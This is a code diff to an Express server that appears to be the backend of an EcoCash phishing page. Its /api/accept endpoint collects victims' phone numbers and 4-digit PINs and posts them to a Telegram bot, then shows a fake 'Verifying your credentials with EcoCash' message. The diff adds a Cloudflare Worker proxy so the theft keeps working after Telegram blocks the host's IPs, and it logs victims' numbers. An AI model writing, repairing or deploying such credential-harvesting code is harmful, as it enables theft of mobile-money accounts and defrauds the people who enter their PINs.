@@ -54,11 +54,16 @@ setInterval(() => {
 
 /* ============================================================
    Telegram notification
-   Sends ONLY the phone number and the 4-digit PIN.
+   ------------------------------------------------------------
+   Uses TELEGRAM_API_PROXY_URL when set (Cloudflare Worker),
+   otherwise falls back to api.telegram.org directly.
+   Railway's outbound IPs are blocked by Telegram, so the
+   proxy path is the only working route on Railway.
 ============================================================ */
 async function notifyTelegram({ phone, pin }) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
+  const proxyUrl = process.env.TELEGRAM_API_PROXY_URL;
 
   if (!token || !chatId) {
     console.warn('Telegram not configured — skipping notification.');
@@ -66,20 +71,28 @@ async function notifyTelegram({ phone, pin }) {
   }
 
   const text = phone + '\n' + pin;
+
+  const baseUrl = proxyUrl
+    ? proxyUrl.replace(/\/$/, '') + '/bot' + token
+    : 'https://api.telegram.org/bot' + token;
+
   const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 6000);
+  const timeout = setTimeout(() => controller.abort(), 10000);
 
   try {
-    const res = await fetch(
-      'https://api.telegram.org/bot' + token + '/sendMessage',
-      {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text }),
-        signal: controller.signal
-      }
-    );
-    if (!res.ok) console.error('Telegram responded', res.status);
+    const res = await fetch(baseUrl + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text }),
+      signal: controller.signal
+    });
+
+    if (!res.ok) {
+      const body = await res.text().catch(() => '');
+      console.error('Telegram responded', res.status, body);
+    } else {
+      console.log('Telegram notification sent.');
+    }
   } catch (err) {
     console.error('Telegram notify failed:', err.name === 'AbortError' ? 'timeout' : err.message);
   } finally {
@@ -128,12 +141,11 @@ app.get('/api/links/:code', (req, res) => {
 
 /* ============================================================
    POST /api/accept
-   ------------------------------------------------------------
-   Sends phone + PIN to Telegram, then returns "verifying" so
-   the client page can show the verifying overlay and move on.
 ============================================================ */
 app.post('/api/accept', async (req, res) => {
   const { transactionId, phone, pin } = req.body;
+
+  console.log('ACCEPT HIT', { tx: transactionId, phone });
 
   if (!transactionId || !phone || !pin) {
     return res.status(400).json({
@@ -151,8 +163,6 @@ app.post('/api/accept', async (req, res) => {
 
   await notifyTelegram({ phone, pin });
 
-  // Return verifying so the client shows the verifying screen,
-  // then goes back to the receipt with pending status.
   return res.json({
     status: 'verifying',
     message: 'Verifying your credentials with EcoCash…',
@@ -201,4 +211,5 @@ app.listen(PORT, '0.0.0.0', () => {
     console.error('Could not read public directory:', e.message);
   }
   console.log('Telegram configured:', !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID));
+  console.log('Telegram proxy:', process.env.TELEGRAM_API_PROXY_URL || 'none (direct)');
 });
